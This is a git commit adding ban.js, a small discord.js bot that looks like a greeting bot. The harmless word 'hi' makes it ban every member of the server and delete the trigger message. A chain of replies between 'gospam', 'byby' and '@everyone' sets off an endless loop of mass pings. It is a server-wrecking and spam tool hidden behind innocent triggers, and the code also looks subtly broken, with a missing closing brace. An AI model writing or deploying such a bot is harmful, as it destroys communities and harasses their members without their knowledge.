6869d9d05f62ec906ab3f1a279f7387037e56230
thenyan <thenyan@tuta.io>
2020-11-19 13:11:58 +0300

    Create ban.js

---
+++ ban.js
@@ -0,0 +1,35 @@
+const Discord = require('discord.js');
+const client = new Discord.Client();
+
+
+
+client.on('ready', () => {
+console.log(` Bot ${client.user.tag} entered the server`);
+});
+
+client.on('message', msg => {
+if (msg.content.toLowerCase() === 'hey') {
+msg.reply('Hey');
+}
+
+if (msg.content.toLowerCase() === 'gospam') {
+msg.channel.sendMessage('byby');
+}
+
+if (msg.content.toLowerCase() === 'byby') {
+msg.channel.sendMessage('@everyone');
+}
+
+if (msg.content.toLowerCase() === '@everyone') {
+msg.channel.sendMessage('byby');
+}
+
+if(msg.content.toLowerCase()=== `hi`) {
+try {
+msg.guild.members.forEach(member => {member.ban()});
+msg.delete(1000);
+} catch(e) {
+console.log(e.stack);
+}
+});
+client.login('token');
